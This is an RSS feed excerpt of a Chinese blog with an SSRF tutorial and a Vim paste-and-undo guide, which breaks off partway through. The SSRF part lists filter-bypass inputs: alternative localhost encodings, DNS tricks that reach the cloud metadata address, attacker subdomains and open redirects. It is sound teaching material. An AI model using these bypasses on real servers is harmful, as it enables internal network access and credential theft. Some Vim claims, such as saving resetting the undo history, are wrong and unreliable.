        <description>&lt;img src="https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/5e5493849d8aa623ccc456998df80032a5625b429097b062a957b14d4fce5079.png" alt="Featured image of post SSRF基础" /&gt;&lt;h1 id=&#34;ssrf基础&#34;&gt;SSRF基础
&lt;/h1&gt;&lt;h2 id=&#34;什么是ssrf&#34;&gt;什么是SSRF
&lt;/h2&gt;&lt;p&gt;SSRF 代表服务器端请求伪造。这是一个漏洞，允许恶意用户使 Web 服务器向攻击者选择的资源发出额外或经过编辑的 HTTP 请求。&lt;/p&gt;
&lt;h2 id=&#34;ssrf-的类型&#34;&gt;SSRF 的类型
&lt;/h2&gt;&lt;p&gt;SSRF 漏洞有两种类型;第一个是常规 SSRF，其中数据返回到攻击者的屏幕。第二个是盲目 SSRF 漏洞，其中发生了 SSRF，但没有信息返回到攻击者的屏幕。&lt;/p&gt;
&lt;h2 id=&#34;影响是什么&#34;&gt;影响是什么？
&lt;/h2&gt;&lt;p&gt;成功的 SSRF 攻击可能导致以下任何情况：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;进入未经授权的区域。&lt;/li&gt;
&lt;li&gt;访问客户/组织数据。&lt;/li&gt;
&lt;li&gt;能够扩展到内部网络。&lt;/li&gt;
&lt;li&gt;显示身份验证令牌/凭据。&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;查找ssrf漏洞&#34;&gt;查找SSRF漏洞
&lt;/h2&gt;&lt;p&gt;可以通过多种不同的方式在 Web 应用程序中发现潜在的 SSRF 漏洞。以下是四个常见位置的示例：&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;当地址栏的参数中使用完整 URL 时：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/image-20250319153429518.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
	
&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;表单中的隐藏字段：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/image-20250319153443076.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
	
&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;部分 URL，例如主机名：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/image-20250319153458456.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
	
&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;或者可能只是 URL 的路径：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/image-20250319153510906.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
	
&gt;&lt;/p&gt;
&lt;p&gt;其中一些示例比其他示例更容易被利用，因此需要进行大量试验和错误才能找到有效的有效负载。&lt;/p&gt;
&lt;p&gt;如果使用盲 SSRF，并且没有输出反射给您，则需要使用外部 HTTP 日志记录工具来监控请求，例如 requestbin.com、您自己的 HTTP 服务器或 Burp Suite 的协作者客户端。&lt;/p&gt;
&lt;h2 id=&#34;常见的防御手段与应对&#34;&gt;常见的防御手段与应对
&lt;/h2&gt;&lt;p&gt;更了解安全漏洞的开发人员意识到 SSRF 漏洞的风险，可以在其应用程序中实施检查，以确保请求的资源符合特定规则。通常有两种方法，拒绝列表或允许列表。&lt;/p&gt;
&lt;h3 id=&#34;拒绝列表&#34;&gt;拒绝列表
&lt;/h3&gt;&lt;p&gt;在拒绝列表 （Deny List） 中，接受除列表中指定的资源或与特定模式匹配的资源之外的所有请求。Web 应用程序可以使用拒绝列表来保护敏感端点、IP 地址或域不被公众访问，同时仍允许访问其他位置。限制访问的特定端点是 localhost，它可能包含服务器性能数据或其他敏感信息，因此 localhost 和 127.0.0.1 等域名会出现在拒绝列表中。攻击者可以使用替代本地主机引用绕过拒绝列表，例如 0、0.0.0.0、0000、127.1、127.&lt;em&gt;.&lt;/em&gt;.*、2130706433、017700000001 或具有解析为 IP 地址 127.0.0.1 的 DNS 记录的子域，例如 127.0.0.1.nip.io。&lt;/p&gt;
&lt;p&gt;此外，在云环境中，阻止对 IP 地址 169.254.169.254 的访问将是有益的，该地址包含已部署云服务器的元数据，包括可能的敏感信息。攻击者可以通过在自己的域上注册一个子域来绕过此问题，该子域的 DNS 记录指向 IP 地址 169.254.169.254。&lt;/p&gt;
&lt;h3 id=&#34;允许列表&#34;&gt;允许列表
&lt;/h3&gt;&lt;p&gt;在允许列表中，除非所有请求都显示在列表中或与特定模式匹配，例如参数中使用的 URL 必须以 &lt;a class=&#34;link&#34; href=&#34;https://website.thm&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://website.thm&lt;/a&gt; 开头的规则，否则所有请求都会被拒绝。攻击者可以通过在攻击者的域名上创建子域（例如 &lt;a class=&#34;link&#34; href=&#34;https://website.thm.attackers-domain.thm&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;https://website.thm.attackers-domain.thm&lt;/a&gt;）来快速规避此规则。应用程序逻辑现在将允许此输入，并允许攻击者控制内部 HTTP 请求。&lt;/p&gt;
&lt;h3 id=&#34;打开重定向&#34;&gt;打开重定向
&lt;/h3&gt;&lt;p&gt;如果上述绕过不起作用，那么攻击者还有一个技巧，即开放重定向。开放重定向是服务器上的一个端点，网站访问者会在其中自动重定向到另一个网站地址。以 link https://website 为例。thm/link？url=https：//tryhackme.com 的创建此端点是为了记录访客出于广告/营销目的点击此链接的次数。但是想象一下，存在一个潜在的 SSRF 漏洞，其严格的规则只允许以 https://website 开头的 URL。thm/。攻击者可以利用上述功能将内部 HTTP 请求重定向到攻击者选择的域。&lt;/p&gt;
</description>
        </item>
        <item>
        <title>常见工具及使用技巧</title>
        <link>https://Yerucrem.github.io/p/%E5%B8%B8%E8%A7%81%E5%B7%A5%E5%85%B7%E5%8F%8A%E4%BD%BF%E7%94%A8%E6%8A%80%E5%B7%A7/</link>
        <pubDate>Wed, 19 Mar 2025 00:00:00 +0000</pubDate>
        
        <guid>https://Yerucrem.github.io/p/%E5%B8%B8%E8%A7%81%E5%B7%A5%E5%85%B7%E5%8F%8A%E4%BD%BF%E7%94%A8%E6%8A%80%E5%B7%A7/</guid>
        <description>&lt;h1 id=&#34;常见工具及使用技巧&#34;&gt;常见工具及使用技巧
&lt;/h1&gt;&lt;h2 id=&#34;vim&#34;&gt;VIM
&lt;/h2&gt;&lt;h3 id=&#34;粘贴&#34;&gt;粘贴
&lt;/h3&gt;&lt;h4 id=&#34;1-普通模式下的粘贴&#34;&gt;1. &lt;strong&gt;普通模式下的粘贴&lt;/strong&gt;
&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;&lt;code&gt;p&lt;/code&gt;&lt;/strong&gt;：在光标&lt;strong&gt;后&lt;/strong&gt;粘贴内容（默认粘贴 Vim 的匿名寄存器 &lt;code&gt;&amp;quot;&amp;quot;&lt;/code&gt; 中的内容）。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;&lt;code&gt;P&lt;/code&gt;&lt;/strong&gt;（大写）：在光标&lt;strong&gt;前&lt;/strong&gt;粘贴内容。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;&lt;code&gt;&amp;quot;+p&lt;/code&gt;&lt;/strong&gt; 或 &lt;strong&gt;&lt;code&gt;&amp;quot;*p&lt;/code&gt;&lt;/strong&gt;：粘贴&lt;strong&gt;系统剪贴板&lt;/strong&gt;内容（需确保 Vim 支持系统剪贴板，例如在 Linux 安装 &lt;code&gt;vim-gtk&lt;/code&gt; 或 &lt;code&gt;vim-gnome&lt;/code&gt;）。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;示例&lt;/strong&gt;：&lt;/p&gt;
&lt;p&gt;vim&lt;/p&gt;
&lt;p&gt;复制&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-vim&#34; data-lang=&#34;vim&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nx&#34;&gt;yy&lt;/span&gt;    # &lt;span class=&#34;nx&#34;&gt;复制当前行到匿名寄存器&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nx&#34;&gt;p&lt;/span&gt;     # &lt;span class=&#34;nx&#34;&gt;在光标后粘贴&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c&#34;&gt;&amp;#34;+yy  # 复制当前行到系统剪贴板&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c&#34;&gt;&amp;#34;+p   # 粘贴系统剪贴板内容&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;hr&gt;
&lt;h4 id=&#34;2-插入模式下的粘贴&#34;&gt;2. &lt;strong&gt;插入模式下的粘贴&lt;/strong&gt;
&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;**&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Ctrl+R
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;+ 寄存器名**：在插入模式下粘贴指定寄存器的内容。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;Ctrl+R &amp;quot;&lt;/code&gt;：粘贴匿名寄存器的内容。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;Ctrl+R +&lt;/code&gt;：粘贴系统剪贴板内容（&lt;code&gt;+&lt;/code&gt; 寄存器）。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;示例&lt;/strong&gt;：&lt;/p&gt;
&lt;p&gt;vim&lt;/p&gt;
&lt;p&gt;复制&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-vim&#34; data-lang=&#34;vim&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nx&#34;&gt;i&lt;/span&gt;                # &lt;span class=&#34;nx&#34;&gt;进入插入模式&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nx&#34;&gt;Ctrl&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;R&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;+&lt;/span&gt;         # &lt;span class=&#34;nx&#34;&gt;粘贴系统剪贴板内容&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;hr&gt;
&lt;h4 id=&#34;3-粘贴模式避免自动缩进&#34;&gt;3. &lt;strong&gt;粘贴模式（避免自动缩进）&lt;/strong&gt;
&lt;/h4&gt;&lt;p&gt;当粘贴代码时，自动缩进可能导致格式混乱。解决方式：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;&lt;code&gt;:set paste&lt;/code&gt;&lt;/strong&gt;：进入粘贴模式（禁用自动缩进）。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;&lt;code&gt;:set nopaste&lt;/code&gt;&lt;/strong&gt;：退出粘贴模式。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;或者用快捷键&lt;/strong&gt;：&lt;/p&gt;
&lt;p&gt;vim&lt;/p&gt;
&lt;p&gt;复制&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-vim&#34; data-lang=&#34;vim&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c&#34;&gt;&amp;#34; 在插入模式下直接粘贴系统剪贴板（自动处理格式）&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nx&#34;&gt;Shift&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;Insert&lt;/span&gt;    # &lt;span class=&#34;nx&#34;&gt;部分终端支持&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;hr&gt;
&lt;h4 id=&#34;4-选择系统剪贴板寄存器&#34;&gt;4. &lt;strong&gt;选择系统剪贴板寄存器&lt;/strong&gt;
&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;&lt;code&gt;&amp;quot;+y&lt;/code&gt;&lt;/strong&gt;：复制内容到系统剪贴板。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;&lt;code&gt;&amp;quot;+p&lt;/code&gt;&lt;/strong&gt;：粘贴系统剪贴板内容。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;系统差异&lt;/strong&gt;：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Linux：通常使用 &lt;code&gt;&amp;quot;+&lt;/code&gt; 寄存器。&lt;/li&gt;
&lt;li&gt;Windows/macOS：&lt;code&gt;&amp;quot;+&lt;/code&gt; 和 &lt;code&gt;&amp;quot;*&lt;/code&gt; 可能通用。&lt;/li&gt;
&lt;/ul&gt;
&lt;hr&gt;
&lt;h4 id=&#34;5-可视化模式下的粘贴&#34;&gt;5. &lt;strong&gt;可视化模式下的粘贴&lt;/strong&gt;
&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;在可视化模式（&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;v
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;/&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;V
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;/&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Ctrl+V
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;）中选择文本后：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;y&lt;/code&gt; 复制，&lt;code&gt;d&lt;/code&gt; 剪切，&lt;code&gt;p&lt;/code&gt; 粘贴。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr&gt;
&lt;h4 id=&#34;6-常见问题&#34;&gt;6. &lt;strong&gt;常见问题&lt;/strong&gt;
&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;粘贴时代码缩进错乱&lt;/strong&gt;：使用 &lt;code&gt;:set paste&lt;/code&gt; 或 &lt;code&gt;&amp;quot;+p&lt;/code&gt; 从系统剪贴板粘贴。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;无法访问系统剪贴板&lt;/strong&gt;：确保 Vim 支持 &lt;code&gt;+clipboard&lt;/code&gt;（终端输入 &lt;code&gt;vim --version&lt;/code&gt; 检查）。&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;撤销&#34;&gt;撤销
&lt;/h3&gt;&lt;h4 id=&#34;1-基础撤销与重做&#34;&gt;1. &lt;strong&gt;基础撤销与重做&lt;/strong&gt;
&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;&lt;code&gt;u&lt;/code&gt;&lt;/strong&gt;（普通模式下）：撤销最近一次操作（可重复按 &lt;code&gt;u&lt;/code&gt; 逐步回退）。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;&lt;code&gt;Ctrl-R&lt;/code&gt;&lt;/strong&gt;（普通模式下）：重做被撤销的操作（恢复最后一次撤销）。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;示例&lt;/strong&gt;：&lt;/p&gt;
&lt;p&gt;vim&lt;/p&gt;
&lt;p&gt;复制&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-vim&#34; data-lang=&#34;vim&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nx&#34;&gt;dd&lt;/span&gt;    # &lt;span class=&#34;nx&#34;&gt;删除一行&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nx&#34;&gt;u&lt;/span&gt;     # &lt;span class=&#34;nx&#34;&gt;撤销删除&lt;/span&gt;（&lt;span class=&#34;nx&#34;&gt;恢复该行&lt;/span&gt;）
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nx&#34;&gt;Ctrl&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;R&lt;/span&gt; # &lt;span class=&#34;nx&#34;&gt;重做删除&lt;/span&gt;（&lt;span class=&#34;nx&#34;&gt;再次删除该行&lt;/span&gt;）
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;hr&gt;
&lt;h4 id=&#34;2-多步撤销与重做&#34;&gt;2. &lt;strong&gt;多步撤销与重做&lt;/strong&gt;
&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;
&lt;h3 id=&#34;多次按-逐次撤销更早的操作vim-会记录完整的操作历史&#34;&gt;&lt;strong&gt;多次按 &lt;code&gt;u&lt;/code&gt;&lt;/strong&gt;：逐次撤销更早的操作（Vim 会记录完整的操作历史）。
&lt;/h3&gt;&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;多次按 &lt;code&gt;Ctrl-R&lt;/code&gt;&lt;/strong&gt;：逐次重做被撤销的操作。&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr&gt;
&lt;h4 id=&#34;3-撤销到指定状态&#34;&gt;3. &lt;strong&gt;撤销到指定状态&lt;/strong&gt;
&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;&lt;code&gt;:undo N&lt;/code&gt;&lt;/strong&gt;：直接回退到第 &lt;code&gt;N&lt;/code&gt; 次修改前的状态（例如 &lt;code&gt;:undo 5&lt;/code&gt;）。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;&lt;code&gt;:earlier 5s&lt;/code&gt;&lt;/strong&gt;：回退到 5 秒前的状态（支持 &lt;code&gt;s&lt;/code&gt;/&lt;code&gt;m&lt;/code&gt;/&lt;code&gt;h&lt;/code&gt; 单位，如 &lt;code&gt;:earlier 2m&lt;/code&gt;）。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;&lt;code&gt;:later 5s&lt;/code&gt;&lt;/strong&gt;：向未来恢复 5 秒后的状态。&lt;/li&gt;
&lt;/ul&gt;
&lt;hr&gt;
&lt;h4 id=&#34;4-撤销分支undo-tree&#34;&gt;4. &lt;strong&gt;撤销分支（Undo Tree）&lt;/strong&gt;
&lt;/h4&gt;&lt;p&gt;Vim 的撤销历史是一个树形结构（分支），允许在不同修改路径间切换：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;&lt;code&gt;g+&lt;/code&gt;&lt;/strong&gt; 或 &lt;strong&gt;&lt;code&gt;:earlier 1f&lt;/code&gt;&lt;/strong&gt;：跳转到更新的分支版本。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;&lt;code&gt;g-&lt;/code&gt;&lt;/strong&gt; 或 &lt;strong&gt;&lt;code&gt;:later 1f&lt;/code&gt;&lt;/strong&gt;：跳转到更旧的分支版本。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;插件推荐&lt;/strong&gt;：使用 undotree 可视化撤销历史。&lt;/li&gt;
&lt;/ul&gt;
&lt;hr&gt;
&lt;h4 id=&#34;5-撤销插入模式内容&#34;&gt;5. &lt;strong&gt;撤销插入模式内容&lt;/strong&gt;
&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;在插入模式（&lt;code&gt;i&lt;/code&gt;）中输入大量文本后，退出到普通模式按 &lt;code&gt;u&lt;/code&gt;，会&lt;strong&gt;撤销整个插入过程&lt;/strong&gt;（视为一次操作）。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;示例&lt;/strong&gt;：&lt;/p&gt;
&lt;p&gt;vim&lt;/p&gt;
&lt;p&gt;复制&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-vim&#34; data-lang=&#34;vim&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nx&#34;&gt;i&lt;/span&gt;     # &lt;span class=&#34;nx&#34;&gt;进入插入模式&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nx&#34;&gt;Hello&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;World&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;Esc&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt; # &lt;span class=&#34;nx&#34;&gt;输入文本并退出&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nx&#34;&gt;u&lt;/span&gt;     # &lt;span class=&#34;nx&#34;&gt;撤销整个插入&lt;/span&gt;（&lt;span class=&#34;nx&#34;&gt;文本消失&lt;/span&gt;）
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;hr&gt;
&lt;h4 id=&#34;6-重置修改点&#34;&gt;6. &lt;strong&gt;重置修改点&lt;/strong&gt;
&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;&lt;code&gt;:w&lt;/code&gt;&lt;/strong&gt;（保存文件）：保存后会重置撤销历史的起点（无法撤销保存前的操作）。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;&lt;code&gt;:e!&lt;/code&gt;&lt;/strong&gt;：强制重新加载文件（丢弃所有未保存的修改，回到保存状态）。&lt;/li&gt;
&lt;/ul&gt;
&lt;hr&gt;
&lt;h4 id=&#34;7-查看撤销历史&#34;&gt;7. &lt;strong&gt;查看撤销历史&lt;/strong&gt;
